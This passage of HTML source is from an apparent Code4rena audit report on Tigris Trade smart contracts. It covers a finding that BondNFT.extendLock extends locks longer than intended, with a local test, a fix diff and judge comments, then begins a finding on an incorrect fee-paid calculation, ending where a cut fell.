style=\"position:relative;\"><a href=\"#impact-5\" aria-label=\"impact 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<ul>\n<li>Current <code>BondNFT.extendLock</code> function does not work as expected, forcing user who wants to extend their bond to extend them at least for their current bond.period.</li>\n<li>For bonds which were set with a lock period of 365 days, they can not be extended, even after days of their creation.</li>\n</ul>\n<h3 id=\"proof-of-concept-20\" style=\"position:relative;\"><a href=\"#proof-of-concept-20\" aria-label=\"proof of concept 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"typescript\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// In 09.Bond.js,  describe &quot;Extending lock&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;POC: Extending the lock does not work as expected&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mintFor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;100&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// user lock bond funds for 10 days</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lock</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">lock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">StableToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;100&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">10</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fiveDaysTime</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">5</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">24</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">60</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">60</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">eightDaysTime</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">8</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">24</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">60</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">60</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// owner distribute rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;User created a lock for 10 days&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mintFor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;10&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">distribute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;10&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Five days pass</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_increaseTime&quot;</span><span class=\"mtk1\">, [</span><span class=\"mtk12\">fiveDaysTime</span><span class=\"mtk1\">]); </span><span class=\"mtk3\">// Skip 10 days</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_mine&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;</span><span class=\"mtk6\">\\n</span><span class=\"mtk8\">5 days pass&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// User decide to extend their lock three days, given the current implementation the user is forced to extended 13 days</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bondInfoBeforeExtension</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk11\">idToBond</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">`Bond info before extension: {period: </span><span class=\"mtk4\">${</span><span class=\"mtk12\">bondInfoBeforeExtension</span><span class=\"mtk1\">.</span><span class=\"mtk12\">period</span><span class=\"mtk4\">}</span><span class=\"mtk8\">, expireEpoch: </span><span class=\"mtk4\">${</span><span class=\"mtk12\">bondInfoBeforeExtension</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expireEpoch</span><span class=\"mtk4\">}</span><span class=\"mtk8\">}`</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lock</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">extendLock</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">3</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Bond was extended for 3 days&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bondInfoAfterExtension</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk11\">idToBond</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">`Bond info after extension: {period: </span><span class=\"mtk4\">${</span><span class=\"mtk12\">bondInfoAfterExtension</span><span class=\"mtk1\">.</span><span class=\"mtk12\">period</span><span class=\"mtk4\">}</span><span class=\"mtk8\">, expireEpoch: </span><span class=\"mtk4\">${</span><span class=\"mtk12\">bondInfoAfterExtension</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expireEpoch</span><span class=\"mtk4\">}</span><span class=\"mtk8\">}`</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// 8 days pass, user should be able to release the bond given the extension of 3 days (8 days should be enough)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_increaseTime&quot;</span><span class=\"mtk1\">, [</span><span class=\"mtk12\">eightDaysTime</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_mine&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;</span><span class=\"mtk6\">\\n</span><span class=\"mtk8\">8 days later&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;After 13 days (10 original days + 3 days from extension) the user can not release the bond&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// The user decide to claim their part and get their bond amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// The user should recieve all the current funds in the contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lock</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">release</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;!expire&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-20\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-20\" aria-label=\"recommended mitigation steps 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In order to <code>extendLock</code> to work properly, the current implementation  should be changed to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">function extendLock(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint _id,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    address _asset,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint _amount,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint _period,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    address _sender</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) external onlyManager() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    Bond memory bond = idToBond(_id);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    Bond storage _bond = _idToBond[_id];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    require(bond.owner == _sender, &quot;!owner&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    require(!bond.expired, &quot;Expired&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    require(bond.asset == _asset, &quot;!BondAsset&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    require(bond.pending == 0); //Cannot extend a lock with pending rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   uint currentEpoch = block.timestamp/DAY;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-   require(epoch[bond.asset] == block.timestamp/DAY, &quot;Bad epoch&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    require(epoch[bond.asset] == currentEpoch, &quot;Bad epoch&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   uint pendingEpochs = bond.expireEpoch - currentEpoch;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   uint newBondPeriod = pendingEpochs + _period;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   //In order to respect min bond period when we extend a bon</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   // Next line can be omitted at discretion of the protocol and devs</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   // If it is omitted any created bond would be able to be extended always (except from those with period = 365)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   require(newBondPeriod &gt;= 7, &quot;MIN PERIOD&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    require(bond.period+_period &lt;= 365, &quot;MAX PERIOD&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    require(newBondPeriod &lt;= 365, &quot;MAX PERIOD&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    unchecked {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       uint shares = (bond.amount + _amount) * (bond.period + _period) / 365;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       uint shares = (bond.amount + _amount) * newBondPeriod / 365;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       uint expireEpoch = block.timestamp/DAY + bond.period + _period;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       uint expireEpoch = currentEpoch + newBondPeriod;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        totalShares[bond.asset] += shares-bond.shares;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        _bond.shares = shares;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        _bond.amount += _amount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        _bond.expireEpoch = expireEpoch;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        _bond.period += _period;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        _bond.mintTime = block.timestamp; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       _bond.mintEpoch = epoch[bond.asset];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       _bond.mintEpoch = currentEpoch;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][epoch[bond.asset]] * _bond.shares / 1e18;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][currentEpoch] * _bond.shares / 1e18;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    emit ExtendLock(_period, _amount, _sender,  _id);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/359#issuecomment-1385304841\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown that the mechanic for extending locks can cause lock duration to be longer than intended, while rewards math will behave as inputted by the user.</p>\n<p>While an argument for this being a user mistake could be made, I believe that in this case the demonstrated logic flaw takes precedence, that’s because a user interacting with the system as intended will still be locked for longer than intended and receive less rewards for that mistake.</p>\n<p>For this reason (conditionality, logic flaw, no loss of principal) I believe Medium Severity to be appropriate.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/359#issuecomment-1407758971\">GainsGoblin (Tigris Trade) confirmed and  commented</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175579\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175579</a> </p>\n</blockquote>\n<hr>\n<h2 id=\"m-11-_handleopenfees-returns-an-incorrect-value-for-_feepaid-this-directly-impacts-margin-calculations\" style=\"position:relative;\"><a href=\"#m-11-_handleopenfees-returns-an-incorrect-value-for-_feepaid-this-directly-impacts-margin-calculations\" aria-label=\"m 11 _handleopenfees returns an incorrect value for _feepaid this directly impacts margin calculations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/367\">[M-11] <code>_handleOpenFees</code> returns an incorrect value for <code>_feePaid</code>. This directly impacts margin calculations</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/367\">0Kage</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/55\">chaduke</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178\">https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734\">https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734</a></p>\n<h3 id=\"impact-6\" style=\"position:relative;\"><a href=\"#impact-6\" aria-label=\"impact 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Formula for <code>fee paid</code> in <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L734\">Line 734</a> is incorrect leading to incorrect margin calculations. Since this directly impacts the trader margin and associated fee calculations, I’ve marked as HIGH risk.</p>\n<p>On initiating a market order, <code>Margin</code> is adjusted for the <code>fees</code> that is charged by protocol. This adjustment is in <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178\">Line 178 of Trading</a>. Fees computed by <code>_handleOpenFees</code> is deducted from Initial margin posted by user.</p>\n<p>Formula misses to account for the <code>2*referralFee</code> component while calculaing <code>_feePaid</code>.</p>\n<h3 id=\"proof-of-concept-21\" style=\"position:relative;\"><a href=\"#proof-of-concept-21\" aria-label=\"proof of concept 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Note that <code>_feePaid</code> as per formula in Line 734 is the sum of <code>_daoFeesPaid</code>, and sum of  <code>burnerFee</code>&#x26;<code>botFee</code> .  <code>\\_daoFeesPaid</code>is calculated from<code>\\_fees.daoFees</code>which itself is calculated by subtracting<code>2\\*referralFee</code>and<code>botFee\\</code>.</p>\n<p>So when we add back <code>burnerFee</code> and <code>botFee</code> to <code>_feePaid</code>, we are missing to add back the <code>2*referralFee</code>  which was earlier excluded when calculating <code>_daoFeesPaid</code>. While <code>botFee</code> is added back correctly, same adjustment is not being done viz-a-viz referral fee.</p>\n<p>This results in under calculating the <code>_feePaid</code> and 